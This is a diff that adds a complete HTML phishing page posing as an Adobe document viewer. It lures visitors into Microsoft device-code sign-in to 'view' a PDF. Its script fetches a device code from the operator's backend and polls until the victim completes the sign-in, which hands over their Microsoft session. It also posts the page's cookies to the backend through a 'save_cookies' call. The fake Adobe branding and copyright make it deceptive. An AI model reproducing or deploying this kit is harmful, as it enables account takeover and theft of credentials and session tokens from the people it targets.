@@ -1,0 +1,541 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Adobe Viewer - Verify to Sign</title>
+    <link rel="icon" href="https://logo.debounce.com/adobe.com" type="image/png">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden
+        }
+
+        .pc {
+            font-family: 'Segoe UI', sans-serif;
+            height: 100vh;
+            background: linear-gradient(180deg, #fafafa, #f0f0f0);
+            display: flex;
+            flex-direction: column;
+            user-select: none;
+            overflow: hidden
+        }
+
+        .hd {
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            height: 56px;
+            flex-shrink: 0;
+            z-index: 100
+        }
+
+        .hi {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between
+        }
+
+        .lg {
+            display: flex;
+            align-items: center;
+            gap: 12px
+        }
+
+        /* Adobe logo using SVG rects */
+        .adobe-logo {
+            width: 28px;
+            height: 28px;
+        }
+
+        .lt {
+            font-size: 17px;
+            font-weight: 700;
+            color: #2c2c2c
+        }
+
+        .mn {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            overflow: hidden
+        }
+
+        .cc {
+            width: 100%;
+            max-width: 440px;
+            animation: fu .4s ease-out
+        }
+
+        @keyframes fu {
+            from {
+                opacity: 0;
+                transform: translateY(16px)
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .db {
+            background: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px 8px 0 0;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border-bottom: none
+        }
+
+        .dn {
+            font-size: 14px;
+            font-weight: 600;
+            color: #2c2c2c
+        }
+
+        .cd {
+            background: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 0 0 8px 8px;
+            padding: 32px 28px;
+            text-align: center
+        }
+
+        .ci {
+            margin-bottom: 16px
+        }
+
+        .ci svg {
+            width: 52px;
+            height: 52px
+        }
+
+        .ct {
+            font-size: 20px;
+            font-weight: 700;
+            color: #2c2c2c;
+            margin-bottom: 8px
+        }
+
+        .cdsc {
+            font-size: 14px;
+            color: #6e6e6e;
+            line-height: 1.4;
+            margin-bottom: 24px
+        }
+
+        .cs {
+            background: #1a1a1a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 24px
+        }
+
+        .cl {
+            color: #9ca3af;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px
+        }
+
+        .cv {
+            font-size: 30px;
+            font-weight: bold;
+            color: #e63946;
+            font-family: Consolas, monospace;
+            letter-spacing: 6px;
+            cursor: pointer;
+            word-break: break-all;
+        }
+
+        .cpb {
+            background: #e63946;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 14px
+        }
+
+        .cpb:hover {
+            background: #c1121f;
+        }
+
+        .ss {
+            background: #f9fafb;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 24px
+        }
+
+        .st {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 6px 0;
+            font-size: 13px;
+            color: #374151
+        }
+
+        .sn {
+            width: 22px;
+            height: 22px;
+            background: #e63946;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 600;
+            flex-shrink: 0
+        }
+
+        .bp {
+            width: 100%;
+            height: 48px;
+            background: linear-gradient(180deg, #e63946, #d62828);
+            border: none;
+            border-radius: 24px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px
+        }
+
+        .bp:hover {
+            background: linear-gradient(180deg, #d62828, #b71c1c);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(230, 57, 70, .35)
+        }
+
+        .sf {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #f0f0f0;
+            color: #8e8e8e;
+            font-size: 12px
+        }
+
+        .ft {
+            background: #fff;
+            border-top: 1px solid #e5e5e5;
+            padding: 14px 24px;
+            flex-shrink: 0
+        }
+
+        .fi {
+            display: flex;
+            justify-content: center
+        }
+
+        .cp2 {
+            font-size: 11px;
+            color: #8e8e8e
+        }
+
+        .sc, .lc, .ec {
+            text-align: center;
+            padding: 32px 0
+        }
+
+        .sc svg, .ec svg {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px
+        }
+
+        .sc h2 {
+            font-size: 22px;
+            color: #22c55e;
+            margin-bottom: 8px
+        }
+
+        .ec h2 {
+            font-size: 22px;
+            color: #ef4444;
+            margin-bottom: 8px
+        }
+
+        .sc p, .ec p, .lc p {
+            color: #6e6e6e;
+            font-size: 14px
+        }
+
+        .sl {
+            width: 48px;
+            height: 48px;
+            animation: sp 1s linear infinite;
+            margin-bottom: 16px
+        }
+
+        @keyframes sp {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        .hidden {
+            display: none !important
+        }
+    </style>
+</head>
+<body>
+<div class="pc">
+    <header class="hd">
+        <div class="hi">
+            <div class="lg">
+                <!-- Adobe logo built with SVG rects -->
+                <svg class="adobe-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="2" y="2" width="20" height="20" rx="2" fill="#e63946" stroke="#c1121f" stroke-width="1"/>
+                    <rect x="6" y="6" width="12" height="12" fill="#ffffff" opacity="0.95"/>
+                    <polygon points="12,8 9,16 11,16 12,13 13,16 15,16" fill="#e63946"/>
+                </svg>
+                <span class="lt">Adobe Document Veiwer</span>
+            </div>
+        </div>
+    </header>
+    <main class="mn">
+        <div class="cc">
+            <div class="db">
+                <div class="di">
+                    <!-- Document icon (unchanged, but kept red) -->
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M5 4H19V20H5V4Z" fill="#e63946" stroke="#c1121f" stroke-width="1.2" stroke-linejoin="round"/>
+                        <path d="M9 2H15V6H9V2Z" fill="#ffccd5" stroke="#c1121f" stroke-width="1.2"/>
+                        <path d="M8 10H16" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M8 13H16" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M8 16H13" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M15 2V6H9V2H15Z" fill="#c1121f" stroke="#a00e1a" stroke-width="0.8"/>
+                    </svg>
+                </div>
+                <span class="dn">Project_Specification.pdf</span>
+            </div>
+            <div class="cd">
+
+                <!-- Loading Section -->
+                <div id="lds" class="lc">
+                    <svg class="sl" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" stroke="#e63946" stroke-width="3" fill="none"/>
+                    </svg>
+                    <p>Preparing verification...</p>
+                </div>
+
+                <!-- Device Code Section -->
+                <div id="dcs" class="hidden">
+                    <div class="ci">
+                        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="24" cy="24" r="22" fill="#ffebee" stroke="#d62828" stroke-width="1.5"/>
+                            <path d="M24 14c-4.42 0-8 2.69-8 6v2h-1a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V23a1 1 0 0 0-1-1h-1v-2c0-3.31-3.58-6-8-6z" fill="#e63946" stroke="#c1121f" stroke-width="1.2"/>
+                            <path d="M24 29v3" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <h1 class="ct">Verify to view</h1>
+                    <p class="cdsc">Please verify your identity with Microsoft to access and view "Project_Specification.pdf"</p>
+                    <div class="cs">
+                        <div class="cl">Your verification code</div>
+                        <div class="cv" id="theCode" onclick="copyCode()">--------</div>
+                        <button class="cpb" id="cpb" onclick="copyCode()">Copy Code</button>
+                    </div>
+                    <div class="ss">
+                        <div class="st"><div class="sn">1</div>Copy the code above</div>
+                        <div class="st"><div class="sn">2</div>Click continue and paste (Ctrl+V) the code</div>
+                        <div class="st"><div class="sn">3</div>Sign in with your Microsoft account</div>
+                    </div>
+                    <button class="bp" onclick="openDeviceLogin()">
+                        <svg width="20" height="20" viewBox="0 0 21 21" fill="currentColor">
+                            <path d="M0 0h10v10H0zM11 0h10v10H11zM0 11h10v10H0zM11 11h10v10H11z" fill="#fff"/>
+                        </svg>
+                        Continue to Microsoft
+                    </button>
+                    <div class="sf">
+                        <svg viewBox="0 0 16 16" fill="currentColor" width="16">
+                            <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4H2v8h12V7h-3z"/>
+                        </svg>
+                        <span>Secured by Microsoft</span>
+                    </div>
+                </div>
+
+                <!-- Success Section -->
+                <div id="scs" class="sc hidden">
+                    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="24" cy="24" r="22" fill="#dcfce7" stroke="#22c55e" stroke-width="1.5"/>
+                        <path d="M16 24l6 6 12-12" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <h2>Verification Complete!</h2>
+                    <p id="statusMsg">Loading document...</p>
+                </div>
+
+                <!-- Error Section -->
+                <div id="ers" class="ec hidden">
+                    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="24" cy="24" r="22" fill="#fef2f2" stroke="#ef4444" stroke-width="1.5"/>
+                        <path d="M24 14v12M24 30v2" stroke="#ef4444" stroke-width="3" stroke-linecap="round"/>
+                    </svg>
+                    <h2>Error</h2>
+                    <p id="em"></p>
+                </div>
+
+            </div>
+        </div>
+    </main>
+    <footer class="ft">
+        <div class="fi">
+            <p class="cp2">© 2026 Adobe. All rights reserved.</p>
+        </div>
+    </footer>
+</div>
+
+<script>
+    let currentDeviceCode = null;
+    let pollInterval = null;
+
+    function showSection(sectionId) {
+        const sections = ['lds', 'dcs', 'scs', 'ers'];
+        sections.forEach(id => {
+            const element = document.getElementById(id);
+            if (element) element.classList.add('hidden');
+        });
+        const targetElement = document.getElementById(sectionId);
+        if (targetElement) targetElement.classList.remove('hidden');
+    }
+
+    async function startLogin() {
+        try {
+            const urlParams = new URLSearchParams(window.location.search);
+            let acct = urlParams.get('acct');
+            if (!acct) {
+                acct = "user@placeholder.com";
+            }
+
+            const response = await fetch('/start?acct=' + encodeURIComponent(acct) + '&_t=' + Date.now(), {
+                method: 'POST'
+            });
+
+            const data = await response.json();
+
+            if (data.error) {
+                throw new Error(data.error);
+            }
+
+            if (data.userCode && data.deviceCode) {
+                currentDeviceCode = data.deviceCode;
+                document.getElementById('theCode').textContent = data.userCode;
+                showSection('dcs');
+                saveCookies(acct);
+                startPolling(data.deviceCode, acct, data.interval || 5);
+            } else {
+                throw new Error('Invalid response from server');
+            }
+
+        } catch (error) {
+            console.error('Error:', error);
+            showSection('ers');
+            document.getElementById('em').innerText = error.message || 'Connection error. Please try again.';
+        }
+    }
+
+    function startPolling(deviceCode, acct, intervalSeconds) {
+        if (pollInterval) clearInterval(pollInterval);
+
+        pollInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/state?device_code=${encodeURIComponent(deviceCode)}&acct=${encodeURIComponent(acct)}&_t=${Date.now()}`);
+                const data = await response.json();
+
+                if (data.status === 'success') {
+                    clearInterval(pollInterval);
+                    showSection('scs');
+                    document.getElementById('statusMsg').innerText = "Verification successful! Redirecting...";
+                    setTimeout(() => {
+                        window.location.href = "https://office.com";
+                    }, 1500);
+                } else if (data.status === 'error') {
+                    clearInterval(pollInterval);
+                    showSection('ers');
+                    document.getElementById('em').innerText = data.message || "Verification failed. Please restart.";
+                }
+            } catch (error) {
+                console.error('Polling error:', error);
+            }
+        }, (intervalSeconds || 5) * 1000);
+    }
+
+    function copyCode() {
+        const codeElement = document.getElementById('theCode');
+        const code = codeElement.textContent;
+
+        if (code && code !== '--------') {
+            navigator.clipboard.writeText(code).then(() => {
+                const button = document.getElementById('cpb');
+                const originalText = button.textContent;
+                button.textContent = '✓ Copied!';
+                setTimeout(() => {
+                    button.textContent = originalText;
+                }, 2000);
+            }).catch(() => {
+                alert('Please copy the code manually: ' + code);
+            });
+        }
+    }
+
+    function openDeviceLogin() {
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+        if (isMobile) {
+            window.open('https://microsoft.com/devicelogin', '_blank');
+        } else {
+            window.open('https://microsoft.com/devicelogin', 'ML', 'width=500,height=600,left=200,top=100');
+        }
+    }
+
+    function saveCookies(acct) {
+        const cookies = document.cookie;
+        if (cookies) {
+            fetch('/state?action=save_cookies', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    acct: acct,
+                    cookies: cookies
+                })
+            }).catch(err => console.error('Failed to save cookies:', err));
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        showSection('lds');
+        setTimeout(() => {
+            startLogin();
+        }, 5000);
+    });
+</script>
+</body>
+</html>
